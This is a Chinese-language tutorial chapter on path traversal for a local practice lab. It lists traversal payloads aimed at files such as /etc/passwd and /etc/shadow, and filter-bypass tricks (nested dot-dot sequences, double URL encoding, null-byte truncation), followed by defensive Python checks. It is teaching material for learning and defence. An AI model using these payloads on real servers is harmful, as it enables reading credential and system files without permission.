# 7. 路径遍历 (Path Traversal)

## 是什么？

当应用读取文件时没有限制路径，攻击者可以用 `../` 跳转目录，读取服务器上的任意文件。也叫目录遍历、dot-dot-slash 攻击。

## 🧠 原理

```
/var/www/html/
├── app.py
├── templates/
│   └── view.html
└── uploads/
    └── (用户文件)

正常读取：
/var/www/html/uploads/report.txt ✅

路径遍历：
../../../etc/passwd
→ /var/www/html/../../../etc/passwd
→ /etc/passwd                     😱
```

## 🎯 靶场练习 7：路径遍历

打开 `http://127.0.0.1:5000/file/view`

### 练习

```bash
# 先读取靶场自己的代码
?file=app.py

# 向上跳
?file=../web-security-lab/app.py
?file=../../Users/whb/hacker-database/web-security-lab/app.py

# Windows 系统文件
?file=../../../windows/win.ini
?file=../../../windows/system32/drivers/etc/hosts

# Linux 系统文件（如果在 Linux 运行）
?file=../../../etc/passwd
?file=../../../etc/shadow
```

## 🧪 常见绕过技巧

### 1. 简单过滤可轻易绕过

```
过滤: ../ 被删除
?file=....//....//....//etc/passwd  → 删除 ../ 后变成 ../../../etc/passwd

过滤: ../ 被替换为空
?file=..././..././..././etc/passwd
```

### 2. 绝对路径

```
?file=/etc/passwd
?file=C:\Windows\win.ini
```

### 3. URL 编码

```
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd   (../ 编码)
?file=..%252f..%252f..%252fetc%252fpasswd         (双重编码)
```

### 4. 空字节截断（老版本）

```
?file=../../../etc/passwd%00.jpg     # %00 后面的被截断，仍读 /etc/passwd
```

### 5. 长路径回绕

```
?file=../../../../../../../../../../../../../../../../../../etc/passwd
```

## 🛡️ 防御方法

### ✅ 1. 不使用用户输入构造路径（最好）

用 ID 映射而非直接传文件路径：
```python
# ❌ 不安全
open(os.path.join(BASE, request.args['file']))

# ✅ 安全
file_map = {'1': 'report.pdf', '2': 'summary.pdf'}
filename = file_map.get(request.args['id'])
```

### ✅ 2. 白名单

```python
ALLOWED = {'app.py', 'config.ini', 'README.md'}
if filename not in ALLOWED:
    abort(403)
```

### ✅ 3. 规范化路径 + 验证前缀

```python
import os

base = '/var/www/safe/'
user_path = request.args['file']

# 解析 ../ 得到真实路径
real_path = os.path.realpath(os.path.join(base, user_path))

# 确保真实路径在允许的目录内
if not real_path.startswith(base):
    abort(403)
```

### ✅ 4. 去除危险字符

```python
if '..' in filename or '/' in filename or '\\' in filename:
    abort(403)
```

---

## 📝 练习

1. 在靶场读取 `app.py` 源码
2. 尝试读取系统文件
3. 思考：`os.path.realpath` 为什么能防路径遍历？

---

**下一步**：[IDOR 越权访问](08-idor.md)
